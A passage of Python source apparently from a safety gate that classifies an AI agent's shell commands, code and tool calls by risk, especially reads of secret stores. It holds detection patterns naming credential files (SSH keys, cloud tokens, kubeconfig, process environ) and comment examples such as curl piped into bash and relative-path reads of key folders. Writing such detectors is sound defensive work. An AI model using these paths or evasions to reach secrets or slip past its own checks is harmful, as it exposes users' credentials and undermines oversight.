                    # -C dir, -xC dir, -cfC x.tar dir, old-style czfC x.tar dir: the values follow in letter order
                    m = j + sum(c in "fbgFHIKLNTVX" for c in a[:a.index("C")])
                else:
                    continue
                if m is None:
                    targets.append(val)
                    skip.add(i + j)
                elif m < len(rest):
                    targets.append(rest[m])
                    skip.add(i + 1 + m)
        elif prog in ("jq", "yq", "gojq", "jaq"):    # the filter (`jq .`) is not a path, unless it is read from a file
            first = next((f for f, a in enumerate(rest) if not a.startswith("-")), None)
            from_file = any(a == "--from-file" or a.startswith("--from-file=") or re.fullmatch(r"-[a-zA-Z]*f[a-zA-Z]*", a)
                            for a in rest)
            if first is not None and not from_file:
                skip.add(i + 1 + first)
        elif prog in _SHELLS:
            for j, a in enumerate(rest):
                if a == "-c" or (re.fullmatch(r"-[a-zA-Z]+", a) and "c" in a):
                    bodies += rest[j + 1:j + 2]
                    break
                if not a.startswith(("-", "+")):
                    break
            else:
                bodies += [h.body for h in k.heredocs] + [w.text for w in k.herestrings]
        # not the program, the targets, or the words before the program but assignments (`! time sudo -u root`)
        words = [w for j, w in enumerate(k.words) if j not in skip and (j > i or _ASSIGN.fullmatch(w.text))] + \
            [t for _, t in k.redirs]
        # (text, has an unquoted {); a word with a space is prose (a commit message, an echo, awk's '{print $1}'),
        # not a path, unless bash expands a brace set in it ({config,"a b"})
        pieces += [(w.text, w.brace) for w in words if w.brace or not re.search(r"\s", w.text)]


_ANY = object()                                     # any path, in _cd_store_read's index of levels up


def _cd_store_read(cmds: list, subs: list) -> str:
    """D-038 (#192): a line that enters a folder that can hold a secret store may read it by a relative name. It
    enters one when a working-folder target anywhere in it ($( ), <( ) and a shell's text included) has a store
    folder among its parts (~/.kube, ~/.config/nvim, /proc/self; see _store_hints), or goes by a relative name into
    a plain store folder below another target (`cd ~/.config && cd ./gh`, `cd / && cd proc`). Then a relative name
    counts when its file name is a store file's (a glob or brace set: when it could match one) or it goes into a
    store folder (`gh/x` after ~/.config, `../.docker/x`); any relative name counts when the target is itself a
    store. The targets' own words are not names. The name, or ''. One pass over the words; neither the order nor
    the success of the commands is followed, so this fails closed."""
    targets: list = []
    pieces: list = []
    bodies: list = []
    _cd_walk(cmds, targets, pieces, bodies)
    queue = [(s, 0) for s in subs] + [(b, 1) for b in bodies]
    seen: dict = {}             # text -> the shallowest depth it was read at
    while queue:                # each $( ), <( ) and shell text once per depth at most, nested ones too
        text, n = queue.pop()   # (subs may list them already); a text first met at the depth cap is read again
        if seen.get(text, _DEPTH + 1) <= n:     # when it comes up shallower, so its own bodies are not lost
            continue
        seen[text] = n
        c2, s2 = _parse(text)[:2]
        more: list = []
        _cd_walk(c2, targets, pieces, more)
        if n < _DEPTH:
            queue += [(s, n + 1) for s in s2] + [(b, n + 1) for b in more]
    if not targets:
        return ""
    singles, pairs, names = _store_hints()
    home = os.path.normpath(_home())
    root = home.rstrip("/") + "/"
    hp = home.rstrip("/").split("/")                # "/home/u": ["", "home", "u"]
    kin: dict = {}                                  # plain store folder name -> [(its parent, its sample path)]
    for (a, b), path in pairs.items():
        kin.setdefault(b, []).append((a, path))
    deep = max(len(p.split("/")) for p in pairs.values())       # the parts of the deepest sample store folder

    def here(t: str) -> str:                        # the current folder as `.`, ${PWD%/*/*} as `../..`
        return _HERE.sub(lambda m: "/".join([".."] * m.group(0).count("/*")) if "%" in m.group(0) else ".", t)

    def folders(t: str) -> tuple:
        t = here(t)
        if re.match(r"~[\w.-]+(/|$)", t):          # ~root/..: that home, before .. is resolved
            t = os.path.expanduser(t)
        p = _expand_text(t)
        p = os.path.normpath(p) if p else p         # bash's logical cd: /tmp/../proc is /proc, ./gh is gh
        p = "~" if p == home else "~/" + p[len(root):] if p.startswith(root) else p
        parts = _brace_glob(p).split("/")
        parts[0] = "~" if parts[0].startswith("~") else parts[0]        # ~user/.kube: its folders
        return p, [s for j, s in enumerate(parts) if s not in ("", ".") or j == 0 and s == ""] or ["."]

    def could_be(s: str, prev) -> set:
        """The store folder names a glob part could be below the part ``prev``, as bash matches: a dot name only
        when the glob spells the dot, a folder that is a store by its name anywhere (Netlify) only when the glob
        has a character of its own, and a plain store folder only below its parent."""
        own = bool(re.sub(r"[*?]|\[[^\]]*\]?", "", s))
        return {x for x in singles if (x[:1] == ".") == (s[:1] == ".") and (x[:1] == "." or own)} | \
            {b for a, b in pairs if a == prev and (b[:1] == ".") == (s[:1] == ".")}

    def last_store_folder(parts: list) -> int:
        return max((k for k, s in enumerate(parts) if s in singles or k and (parts[k - 1], s) in pairs or
                    _GLOBBY.search(s) and _could_name(s, could_be(s, parts[k - 1] if k else None))), default=-1)

    # A plain store folder's parent above each target: name -> {levels up: its paths}. A target below home also
    # has home's own folders above it; a relative one only its own parts (what it is below is not known). A path
    # deeper than any sample store folder's parent keeps only its name, which is all a dot parent needs.
    parents = {a for a, _ in pairs}
    anc: dict = {}
    top: dict = {}                                  # (name, its path or _ANY) -> the most levels up it is at
    lo: dict = {}                                   # the fewest levels up at which / is

    def index(parts: list) -> None:
        up = [(hp[m], "/".join(hp[:m + 1])) for m in range(len(hp) - 1)] if parts[0] == "~" else []
        chain = up + [(s, "/".join(parts[:j + 1]) if j < deep else None) for j, s in enumerate(parts) if s != ".."]
        for n, (name, path) in enumerate(reversed(chain)):
            if name in parents:
                anc.setdefault(name, {}).setdefault(n, set()).add(path)
                for key in ((name, path), (name, _ANY)):
                    top[key] = max(top.get(key, -1), n)
                if name == "":
                    lo[""] = min(lo.get("", n), n)

    split = [(p, parts, last_store_folder(parts)) for t in dict.fromkeys(targets) for alt in _brace_alts(t)
             for p, parts in [folders(alt)]]
    for _, parts, _ in split:
        index(parts)
    # `cd ..`, `cd ../..`, `cd .. && cd ..`: every number of levels up to all of them together (order is not
    # followed); past 64, any number
    total = sum(len(parts) for t in targets if ".." in here(t) for alt in _brace_alts(t) for _, parts in [folders(alt)]
                if set(parts) == {".."})
    ups = set(range(min(total, 65) + 1))

    def reach(n: int, a: str, need) -> bool:
        """A folder named ``a`` (at path ``need`` for a plain parent) n levels above a target, or above a `cd ..`
        after one. `..` stops at /."""
        levels = anc.get(a, {})
        if a == "" and lo.get("", n + max(ups) + 1) <= n + max(ups):
            return True
        if len(ups) > 64:                           # any number of levels up: is it there n or more levels up?
            return top.get((a, _ANY if need is None else need), -1) >= n
        return any(m in levels and (need is None or need in levels[m]) for m in (n + u for u in ups))

    matched: dict = {}                              # a glob -> the plain store folder names it could match

    def into(parts: list, globs: bool = True) -> list:
        """A relative path into a plain store folder below another target (`cd ~/.config && cd ./gh`, `cd / && cd
        proc/self`, `cd ~/.config/nvim && cd ../gcloud`): [(that store folder's sample path, the rest)]. The other
        target names a dot parent by its name (any .config) and a plain one by its path (/, EXO_HOME)."""
        n = next((j for j, s in enumerate(parts) if s != ".."), len(parts))
        if n == len(parts) or parts[0] in ("", "~"):
            return []
        first = parts[n]
        if globs and _GLOBBY.search(first) and first not in matched:
            matched[first] = _glob_names(first, kin) if _could_name(first, set(kin)) else []
        hits = matched[first] if globs and _GLOBBY.search(first) else [first] if first in kin else []
        return [(path, parts[n + 1:]) for b in hits for a, path in kin[b]
                if reach(n, a, None if a in singles else path.rpartition("/")[0])]

    # A relative target into a plain store folder enters it, at that folder's sample path. Its own folders then
    # count as parents too (`cd /srv && cd exo-home && cd keys` with EXO_HOME=/srv/exo-home); a chain is as deep
    # as the sample paths, so this ends.
    after: dict = {}
    new = {"/".join([path, *rest]): None for _, parts, _ in split for path, rest in into(parts)}
    while new.keys() - after.keys():
        fresh = new.keys() - after.keys()
        after.update(new)
        for full in fresh:
            index(full.split("/"))
        new = {"/".join([path, *rest]): None for _, parts, _ in split for path, rest in into(parts)}
    split += [(full, full.split("/"), last_store_folder(full.split("/"))) for full in after]
    entered = [(p, parts, k) for p, parts, k in split if k >= 0]
    stored: dict = {}

    def is_store(folder: str) -> bool:
        """Is the folder a store? A glob in it (`~/.s?h`) is tried as each store folder name it could be
        (could_be). Past 64 such paths, it counts as one."""
        if folder not in stored:
            parts = folder.split("/")
            opts = [_glob_names(s, could_be(s, parts[j - 1] if j else None)) if _GLOBBY.search(s) else [s]
                    for j, s in enumerate(parts)]
            count = 1
            for o in opts:
                count = min(count * len(o), 65)
            paths = ["/".join(x) for x in itertools.product(*opts)] if count <= 64 else []
            stored[folder] = count > 64 or any(_SENSITIVE_PATH.search(x) or is_sensitive_path(x) for x in paths)
        return stored[folder]

    def candidates():
        """The relative names on the line: (name, its parts, whether it is a glob); no parts is the folder itself
        (`.`, `$PWD`). A quoted glob counts too, for the tools that match it themselves (`find -name 'conf*'`)."""
        for word, brace in dict.fromkeys(pieces):
            for text in [here(_brace_glob(x)) for x in _brace_alts(word)] if brace else [here(word)]:
                # --kubeconfig=config, -d@config, f:=@config; a glob class (e[[:alpha:]]viron) stays whole
                whole = text.count("[") > 32 or _NESTED_CLASS.search(text)
                for q in re.split(r"[=@:,]", text) + ([text] if whole else []):
                    q = here(q)
                    q = _expand_text(q) if q[:1] in ("$", "~") else q
                    if not q or q.startswith(("/", "-")) or q.startswith("~") and q[1:2] not in ("+", "-"):
                        continue
                    q = os.path.normpath(q) if "/.." in "/" + q else q         # lua/../../gcloud is ../gcloud
                    yield q, [s for s in q.split("/") if s not in ("", ".")], bool(_GLOBBY.search(q))

    if not entered:
        # A name can still go into a plain store folder below a target: it counts when it names a store file or
        # goes into a store (`cd /srv && tar cf - exo-home/keys` with EXO_HOME=/srv/exo-home).
        for q, parts, globbed in candidates():
            for path, rest in into(parts, globbed) if parts else []:
                fp = f"{path}/{'/'.join(rest)}".rstrip("/").split("/")
                if parts[-1] in names or is_store("/".join(fp[:last_store_folder(fp) + 1])):
                    return q
        return _exo_relative(split, max(ups), candidates)
    nxt = {b for b in kin if into([b])}             # `cd ~/.config && cat gh/hosts.yml`: for a glob piece
    # Is a target itself a store? One full test per store folder it is in (`cd ~/.kube/a1; cd ~/.kube/a2`: one).
    roots = dict.fromkeys("/".join(parts[:k + 1]) for _, parts, k in entered)
    every = any(_SENSITIVE_PATH.search(p) for p, _, _ in entered) or any(map(is_store, roots))
    hints = names | singles | nxt
    held = any(k == len(parts) - 1 for _, parts, k in entered)     # a target is itself a store folder (~/.kube)
    for q, parts, globbed in candidates():
        if every or not parts and held:             # `tar czf - .` in a store, or in a store folder
            return q
        if not parts:
            continue
        inner = parts[:-1]              # a store folder counts when the name goes into it (`mkdir .kube` reads none)
        if parts[-1] in names or not singles.isdisjoint(inner) or into(parts, globbed) or \
                not pairs.keys().isdisjoint(zip(inner, inner[1:])) or globbed and any(
                    _could_name(s, hints) for s in parts if _GLOBBY.search(s)):
            return q
    return _exo_relative(split, max(ups), candidates)


_EXO_PARTS = 65536   # path parts of the folders and paths _exo_relative may build in one classify call (#269)


class _Spent(Exception):
    pass


def _exo_relative(split: list, up: int, candidates: Callable[[], Iterable[tuple]]) -> str:
    """#269: on a line that reaches a folder in `$EXO_HOME` (or any `.exo`), that folder and each relative name read
    from it are checked as the paths they are, as the kernel resolves them, `..` included, so `cd ~/.exo/run/jobs &&
    grep -r . ..`, `cat ../exod*` there, `cd ~/.exo/run/jobs && cd .. && ls` and `tar -C ~/.exo -czf - run` reach the
    run folder and its secrets as the absolute path would (is_sensitive_path, a glob in it). The folders are the
    targets (``split``, as _cd_store_read reads them; one with a glob is left to the store-folder check), each
    relative target joined to each of them, and every folder up to ``up`` levels above them (`cd ..`, counted once:
    a `..` target is not joined too); an absolute target is also resolved (a link into the store). From a folder above the store only a target or name with the
    store's folder name as a part (`.exo`, `exo-home`) is joined, so `cd /srv && tar cf -
    exo-home/run` counts and a line that names no store folder joins nothing. Each join and each level up is charged,
    as it is made, the path parts of what it builds (its checks cost about that much: a deep glob name costs more than a
    short one) to one budget of _EXO_PARTS shared by the whole classify call (each `$( )` is classified again, nested
    ones too), so the work stays linear in the line; past it, or past 64 store folders, the line counts (fails
    closed). The name or folder, or ''."""
    home = os.path.normpath(_home())
    exo = os.path.normpath(_exo_home())
    roots = _path_forms(exo)
    marks = {".exo", os.path.basename(exo)} - {""}
    memo = _call_memo.get()
    left = [_EXO_PARTS] if memo is None else memo.setdefault("exo_parts", [_EXO_PARTS])
    if left[0] < 0:
        return "a path in the Exo store (too many to resolve)"

    def inside(b: str, real: bool = False) -> bool:
        return any(re.search(r"(^|/)\.exo(/|$)", f) or any(f == r or f.startswith(r.rstrip("/") + "/") for r in roots)
                   for f in (_path_forms(b) if real else {os.path.normpath(b)}))

    def near(q: str) -> bool:                       # a relative path that can lead into the store from above it
        return not marks.isdisjoint(q.split("/"))

    def charge(path: str) -> None:                  # one join or level up, by the path parts it builds
        left[0] -= path.count("/") + 1
        if left[0] < 0:
            raise _Spent

    def join(b: str, q: str) -> str:
        w = os.path.join(b, q)
        charge(w)
        return w

    def grow(bases: set, more: str) -> None:
        bases.add(more)
        if len(bases) > 64:
            raise _Spent

    folders = []
    for p, _, _ in split:
        if not (_GLOBBY.search(p) or "$" in p):
            folders.append(os.path.join(home, p[2:]) if p.startswith("~/") else home if p == "~" else p)
    folders = list(dict.fromkeys(folders))
    # a `cd ..` is the level-up walk below (``up`` counts every one on the line), not a join as well
    relative = [r for r in folders if not r.startswith("/") and set(r.split("/")) != {".."}]
    try:
        bases: set = set()
        for b in folders:
            if inside(b, b.startswith("/")):
                grow(bases, b)
        # a folder outside the store that a name can lead into it from: one above it (a relative folder adds nothing
        # a name with `.exo` in it does not already spell)
        outer = [b for b in folders if b.startswith("/") and b not in bases and any(
            r.startswith(b.rstrip("/") + "/") for r in roots)]
        toward = [r for r in relative if near(r)]
        for b in outer:
            for r in toward:
                j = os.path.normpath(join(b, r))
                if inside(j):
                    grow(bases, j)
        for b in list(bases):
            for r in relative:
                j = os.path.normpath(join(b, r))
                if inside(j):
                    grow(bases, j)
        for b in list(bases):
            for _ in range(min(up, 64)):
                charge(b)
                b = os.path.dirname(b)
                if not b or not inside(b):
                    break
                grow(bases, b)
        hit = next((b for b in sorted(bases) if _sensitive_words([b])), "")
        if hit:
            return hit
        names = list(dict.fromkeys(q for q, _, _ in candidates()))
        words = [(q, join(b, q)) for b in sorted(bases) for q in names]
        toward = [q for q in names if near(q)]
        words += [(q, w) for b in outer for q in toward for w in [join(b, q)] if inside(w)]
    except _Spent:
        return "a path in the Exo store (too many to resolve)"
    if not words or not (_sensitive_words([w for _, w in words]) or _glob_words([w for _, w in words])):
        return ""
    return next((q for q, w in words if _sensitive_words([w]) or _glob_words([w])), words[0][0])


def classify_shell(cmd: str, depth: int = 0) -> Classification:
    """Classify a shell command line; a compound line takes its most severe part. Within one top-level call a line is
    classified once per depth and state of the budgets (_shell_seen), and each caller gets its own copy."""
    seen = _shell_seen.get()
    if seen is None:
        token = _shell_seen.set({})
        try:
            return classify_shell(cmd, depth)
        finally:
            _shell_seen.reset(token)
    key = ("shell", cmd, depth, _budgets())   # the budgets only fall: a line met after one fell is read again
    if key not in seen:
        own = _own_text.set([None])           # this line's own slot, not the one of the line around it (#394)
        try:
            seen[key] = _classify_shell(cmd, depth)
        finally:
            _own_text.reset(own)
    return _own_copy(seen[key])


def _budgets() -> tuple:
    """What is left of the call's budgets (_brace_budget, _exo_relative), on which a line's result can depend."""
    left, memo = _brace_left.get(), _call_memo.get()
    return (None if left is None else tuple(left), None if memo is None else memo.get("exo_parts", [_EXO_PARTS])[0])


def _own_copy(c: Classification) -> Classification:
    """A stored result for one caller, who may change its fields and lists. The parts it was built from (D-075) are
    shared: no caller changes a part in place but the ssh hop, which copies its result first."""
    return replace(c, signals=list(c.signals), parts=list(c.parts), _command_views=list(c._command_views))


def _unread_nest() -> Classification:
    """What a $( ) nested past _NEST stands for: an opaque part, signed so that an exported value keeps it."""
    c = _too_deep("", f"a $( ) nested more than {_NEST} levels deep, not read")
    c.signals.append("unread nest")
    return c


def _classify_shell(cmd: str, depth: int) -> Classification:
    # A run of stand-in lines (_Lexer._cut), also one written by hand, is one unread part, taken in one step so that no
    # number of them recurses. The lines after it end here-doc bodies, and are read as any line.
    if m := _STAND_INS.match(cmd or ""):
        rest = cmd[m.end():]
        return _combine([_unread_nest(), classify_shell(rest, depth)], cmd) if rest else _unread_nest()
    cmds, subs, func = _parse(cmd or "")
    ctx: dict = {"subs": subs}
    parts: list[Classification] = []
    prev: _Cmd | None = None
    slot = _own_text.get() or [None]      # classify_shell gives each line its own
    for k in cmds:
        piped = _piped_text(prev, ctx.setdefault("piped", {})) if (k.piped_in and prev is not None) else None
        # A post's body from stdin (#208): only what one simple command writes, never a compound's last command.
        ctx["post_stdin"] = _literal_stdin(k, _literal_pipe(prev) if k.piped_in and not k.piped_group else None)
        slot[0] = k.own
        got = _classify_simple(k, cmd, depth, ctx, piped)
        if k.fed or k.piped_in or _own_stdin(k):          # a nested shell in it reads this stdin (#394)
            got = _given_stdin(got, _stdin_own(k), ctx)
        parts += got
        prev = k
    slot[0] = None
    # A $( ) runs where the gate no longer knows which command it is in, so on a line where one has a stdin of its
    # own, a shell inside a $( ) reads a stdin the gate cannot name (`curl .. | echo $(bash)`).
    given = bool(subs) and any(k.fed or k.piped_in or _own_stdin(k) for k in cmds)
    for sub in subs:
        got = [classify_shell(sub, depth + 1) if depth < _DEPTH else _too_deep(cmd)]
        parts += _given_stdin(got, lambda: None, ctx) if given else got
    parts += ctx.get("late", [])
    if func:
        parts.append(_opaque("defines a shell function", cmd))
    setters = [k.own for k in cmds if _sets_state(k)] + ([None] if func else [])
    c = _combine(parts, cmd)
    if c.category == "credentials":  # a secret beside an irreversible command keeps that command's weight
        c.reversibility = max([c.reversibility] + [p.reversibility for p in parts], key=REVERSIBILITY.index)
    segs = [[w.text for w in k.words] for k in cmds if k.words]
    hit = _shell_credential_hit(cmd, segs, [w.raw for k in cmds for w in k.words + [t for _, t in k.redirs]])
    if hit and c.category != "credentials":
        rev = max((p.reversibility for p in parts), key=REVERSIBILITY.index, default="costly")
        signals = c.signals
        c = _make("credentials", summary=f"shell touching {hit}"[:120], target=hit if "/" in hit or "." in hit else "",
                  command=cmd, reversibility=max(rev, "costly", key=REVERSIBILITY.index))
        c.signals = signals + ["secret store"]
        c.parts = list(parts)
    # D-038: a relative read on a line that enters a store folder may read the store; store_write stays.
    found = _cd_store_read(cmds, subs) if c.category not in ("credentials", "store_write") else ""
    if found:
        rev = max((p.reversibility for p in parts), key=REVERSIBILITY.index, default="costly")
        signals = c.signals
        c = _make("credentials", summary=f"shell touching {found}"[:120], target=found, command=cmd,
                  reversibility=max(rev, "costly", key=REVERSIBILITY.index))
        c.signals = signals + ["secret store"]
        c.parts = list(parts)
    c.command = cmd
    c._command_views = list(dict.fromkeys([
        _policy_command_view(cmd),
        *(view for part in parts for view in part._command_views),
    ]))
    # Outbound text: if several gh segments post text, keep the most severe one's text. Never for a post whose
    # body is a file: another command's heredoc is not that file, and the caller reads the file (#208).
    body = next((h.body for k in cmds for h in k.heredocs), None)
    if not c.text and not c.text_file and c.category in OUTBOUND and body is not None and c.category != "web_post":
        c.text = body
    if setters:
        c.setters = [*c.setters, *setters]    # a new list: c may share its setters with a stored result
    return c


# --- code (execute_code, python -c, node -e ...) -------------------------------------------

_CODE_PATTERNS = [
    (re.compile(r"\b(shutil\.rmtree|os\.remove|os\.unlink|os\.rmdir|Path\([^)]*\)\.unlink|\.rmtree\()"), "delete"),
    (re.compile(r"\b(requests|httpx|session|client|aiohttp\.ClientSession\(\))\.(post|put|patch|delete)\("), "web_post"),
    (re.compile(r"\burllib\.request\.urlopen\([^)]*data="), "web_post"),
    (re.compile(r"\bsmtplib\.SMTP"), "email_send"),
    (re.compile(r"\bproviders_setup\b|/api/providers\b|\bsecret-tool\b|\bremember_secret\b"), "credentials"),
    (re.compile(r"\bstripe\.\w+\.create\("), "payment"),
]
_CODE_STRINGS = re.compile(r"(['\"])((?:(?!\1).){2,400})\1")
_CODE_LISTS = re.compile(r"\[\s*((?:(['\"])(?:(?!\2).)*\2\s*,\s*)+(['\"])(?:(?!\3).)*\3)\s*,?\s*\]")
_BENIGN = ("read", "shell", "opaque_exec", "local_write", "code", "unknown", "web_read")


def classify_code(code: str, own: str | None | EllipsisType = ...) -> Classification:
    """Code the gate cannot run: look for known calls, and read each string literal (and each list of
    string literals, as in subprocess.run([...])) as a shell command. Only results that matter count.
    The code part and each call found carry `own` as their own text (#394): by default the shell command that runs
    the code (`python3 -c '..'`), or the code itself for execute_code. A literal read as a command is only a guess
    at one, so no part of its result has own text, and no rule keyed on `command` lowers it."""
    if own is ...:
        slot = _own_text.get()
        own = slot[0] if slot is not None else code
    return _classify_code(code or "", own)


def _unowned(c: Classification, seen: dict[int, Classification]) -> Classification:
    """``c`` and the parts it was built from, without own text or setters (#394), so code with a literal stays one
    text for _one_text however the literal reads. Parts shared within ``c`` stay shared."""
    if id(c) not in seen:
        seen[id(c)] = replace(c, own=None, setters=[], parts=[_unowned(p, seen) for p in c.parts])
    return seen[id(c)]


def _classify_code(code: str, own: str | None) -> Classification:
    parts = [_make("code", summary="run code", own=own)]
    for rx, cat in _CODE_PATTERNS:
        m = rx.search(code)
        if m:
            parts.append(_make(cat, summary=f"code calls {m.group(0)[:40]}", own=own))
    texts = [m.group(2) for m in _CODE_STRINGS.finditer(code)]
    texts += [" ".join(shlex.quote(s) for _, s in re.findall(r"(['\"])((?:(?!\1).)*)\1", m.group(1)))
              for m in _CODE_LISTS.finditer(code)]
    # A `\n` or `\t` escape in a literal separates commands once the code runs; read that form too.
    texts += [t.replace("\\n", "\n").replace("\\t", "\t") for t in texts if "\\n" in t or "\\t" in t]
    views: list[str] = []
    signals = ["indirection"]
    for s in texts[:200]:
        c = classify_shell(s, depth=_DEPTH - 1)
        views += c._command_views                 # every literal feeds the veto view, benign or not
        signals += [x for x in c.signals if x == "locale translation"]
        # Any part, not only the dominant one: `./build.sh; systemctl enable x` is opaque on top (D-075).
        if any(p.category not in _BENIGN for p in _each_part(c)):
            parts.append(_unowned(c, {}))
    c = _combine(parts, code)      # `classify` stamps the tool; a nested result keeps the shell's (D-075)
    c.command = code
    c.signals = list(dict.fromkeys(c.signals + signals))
    c._command_views = list(dict.fromkeys(views))
    return c


# --- tool table ----------------------------------------------------------------------------

TOOLS: dict[str, str] = {
    **{t: "read" for t in (
        "read_file", "search_files", "web_search", "session_search", "skills_list", "skill_view",
        "vision_analyze", "video_analyze", "read_terminal", "read_window_below", "x_search", "clarify",
        "show_tip", "gui_tour", "focus_pane", "desktop_preview", "drive_preview", "feishu_doc_read",
        "setup_choose", "browser_vault_list", "todo_list", "list_dir", "grep", "glob",
        "skill", "memory_zoom", "exo_trace", "ui")},  # Exo's own read-only tools: load a skill, zoom, trace, a panel
    **{t: "local_write" for t in ("write_file", "patch", "apply_patch", "memory", "skill_manage", "apply_layout",
                                    "annotate_preview", "desktop_project", "edit_file")},
    **{t: "generate" for t in ("image_generate", "video_generate", "text_to_speech")},
    **{t: "delegate" for t in ("delegate_task", "start_chat")},
    "peers": "read", "peer_send": "peer_message",
    "jobs": "read", "job_output": "read", "job_kill": "shell",  # D-032: the bash command itself is classified as foreground bash
    **{t: "credentials" for t in ("browser_vault_fill", "browser_vault_unlock", "browser_vault_save_login",
                                    "browser_vault_enter_code")},
    **{t: "browser" for t in ("browser_cdp", "browser_exec", "browser_dialog", "computer_use")},
    "web_extract": "web_read",
    "send_message": "message_send",
    "react_to_message": "reaction",
    "cronjob_manage": "schedule",
    "process_manage": "shell",
    "close_terminal": "shell",
}

# One list of secret stores, used by the path tools (read/write/patch) and by shell parsing.
# Segment patterns match at any depth; EXO_HOME and EXO_KEYS_FILE overrides are added by
# is_sensitive_path() because they can sit anywhere.
_SENSITIVE_PATH = re.compile(
    r"(^|/)(\.ssh|\.gnupg|\.aws|\.config/gcloud|\.config/muse|\.netrc|\.npmrc|\.pypirc|\.env(\.[\w-]+)?|"
    r"\.?credentials(\.json)?|id_(rsa|dsa|ecdsa|ed25519)(_sk)?|[^/]+\.pem|[^/]+\.key|"
    r"\.claude(/[^/]*)*|"
    r"keys\.env|\.config/exo/keys(\.env)?|\.exo/keys|\.divan/[^/]+\.key|auth\.json|"
    r"client_secret[^/]*\.json|\.unii/[^/]+/token|[^/]*token[^/]*\.(json|txt|pickle|ya?ml)|[^/]+\.token|"
    r"\.config/gh/hosts\.yml|\.git-credentials|\.docker/config\.json|\.kube/config|"
    r"\.config/netlify/config\.json|Netlify/config\.json|\.vercel/auth\.json|"
    r"proc/[^/]+/(task/[^/]+/)?environ)(/|$)")

# D-039: a run folder holds the principal credential and the TCP token beside each socket, so the folder itself
# is a secret store; what is below it keeps its own class (job output in run/jobs/ stays readable). A relative
# path counts only when it spells `.exo/run`: a bare `run` is not resolved against the gate's working folder (a
# relative `keys` is). The secrets are glob samples (_run_secrets); their names already match _SENSITIVE_PATH.
_RUN_DIR = re.compile(r"(^|/)\.exo/(principals/[^/]+/)?run$")

# Concrete examples a shell glob is tested against ("could this glob match a secret store?").
_SENSITIVE_SAMPLES = ("keys.env", ".exo/keys", ".config/exo/keys.env", ".divan/seat.key", "auth.json",
                      "google_token.json", ".unii/acct/token", "client_secret_1.json", ".hermes/p/.env",
                      ".netrc", ".env", ".npmrc", ".pypirc", ".ssh/id_rsa", ".ssh/id_ed25519", ".aws/credentials",
                      ".gnupg/pubring.kbx", "credentials.json", "server.pem",
                      ".config/gh/hosts.yml", ".git-credentials", ".docker/config.json", ".kube/config")


def _home() -> str:
    return os.environ.get("HOME") or os.path.expanduser("~")


def _exo_home() -> str:
    return os.path.expanduser(os.environ.get("EXO_HOME") or "") or os.path.join(_home(), ".exo")


_STORE_VAR = re.compile(r"\$\{(HOME|EXO_HOME|EXO_PRINCIPAL_STORE|CLAUDE_CONFIG_DIR)(?=[^}\w])")
_BRACE_EVENTS = re.compile(r"\\.|\$\{|\}|\n", re.S)


def _store_var(name: str) -> str | None:
    """A store variable as _expand_text spells it: HOME, EXO_HOME and CLAUDE_CONFIG_DIR as the gate reads them, set or
    not; EXO_PRINCIPAL_STORE only when set."""
    if name == "HOME":
        return _home()
    if name == "EXO_HOME":
        return _exo_home()
    if name == "CLAUDE_CONFIG_DIR":
        return os.path.expanduser(os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(_home(), ".claude"))
    store = os.environ.get("EXO_PRINCIPAL_STORE")
    return os.path.expanduser(store) if store else None


def _store_var_ops(text: str, unset: bool, depth: int) -> str:
    """``text`` with each `${VAR<op>word}` of a store variable spelt out (#202). `:-`, `-`, `:=` and `=` give the
    value (_store_var), or the word when ``unset`` or the variable has none; `:+` and `+` give the word, or nothing
    when ``unset``; `:?`, `?` and any other operator (`%/`, `#*/`, `:0`) give the value. The word is spelt out in turn,
    its quotes dropped, to 8 levels. A form that does not close on its line, or with no value to give, stays as is."""
    m = _STORE_VAR.search(text)
    if not m:
        return text
    closes, opened = {}, []          # where each `${` closes, in one pass: a hostile line costs linear time
    for e in _BRACE_EVENTS.finditer(text, m.start()):
        if e[0] == "${":
            opened.append(e.start())
        elif e[0] == "}" and opened:
            closes[opened.pop()] = e.start()
        elif e[0] == "\n":
            opened.clear()
    out, i = [], 0
    while m:
        j = closes.get(m.start())
        if j is not None:
            op = re.match(r":?[-=?+]", text[m.end():j])
            kind, word, rep = op[0][-1] if op else "", text[m.end() + (op.end() if op else 0):j], _store_var(m[1])
            if kind == "+" and unset:
                rep = ""
            elif kind == "+" or kind in ("-", "=") and (unset or rep is None):
                rep = _expand_text(word.replace('"', "").replace("'", ""), unset, depth + 1) if depth < 8 else None
            if rep is not None:
                out.append(text[i:m.start()] + rep)
                i = j + 1
        m = _STORE_VAR.search(text, j + 1 if j is not None else m.end())
    return "".join(out) + text[i:]


def _expand_text(text: str, unset: bool = False, depth: int = 0) -> str:
    """~, $HOME and $EXO_HOME (also ${...}, and ${EXO_HOME:-word} and the other operators, see _store_var_ops) spelled
    out; nothing else is evaluated. With ``unset``, a `${VAR:-word}` form is read as bash reads it when VAR is unset."""
    text = _store_var_ops(text, unset, depth)
    home, exo = _home(), _exo_home()
    store = os.environ.get("EXO_PRINCIPAL_STORE")
    if store:
        text = re.sub(r"\$\{?EXO_PRINCIPAL_STORE\}?", lambda m: os.path.expanduser(store), text)
    text = re.sub(r"\$\{?EXO_HOME\}?", lambda m: exo, text)
    text = re.sub(r"\$\{?HOME\}?", lambda m: home, text)
    claude_dir = os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(home, ".claude")
    text = re.sub(r"\$\{?CLAUDE_CONFIG_DIR\}?", lambda m: os.path.expanduser(claude_dir), text)
    return re.sub(r"(^|(?<=[\s'\"=:<>]))~(?=/|$|\s|['\"])", lambda m: m.group(1) + home, text)


def _dynamic_secret_paths() -> list[str]:
    paths = [os.path.join(_exo_home(), "keys")]
    kf = os.environ.get("EXO_KEYS_FILE")
    paths.append(os.path.expanduser(kf) if kf else os.path.join(_home(), ".config", "exo", "keys.env"))
    claude_dir = os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(_home(), ".claude")
    paths.append(os.path.expanduser(claude_dir))
    return paths


def _is_run_dir(path: str, real: str = "") -> bool:
    """The run folder itself (D-039), in any spelling: `$EXO_HOME/run`, `.exo/run` or a principal's `run`. An
    absolute path is also resolved as written, links before `..` (``real``, when the caller has resolved it)."""
    raw = path.replace("\\", "/")
    path = os.path.normpath(raw)
    if _RUN_DIR.search(path):
        return True
    if not path.startswith("/"):
        return False
    try:
        cands = {c for c in (path, real or os.path.realpath(raw)) if c.endswith("/run")}
        homes = {os.path.normpath(_exo_home()), os.path.realpath(_exo_home())} if cands else set()
    except (OSError, ValueError):
        return False
    return any(re.fullmatch(re.escape(h) + r"(/principals/[^/]+)?/run", c) for c in cands for h in homes)


def _run_secrets() -> list[str]:
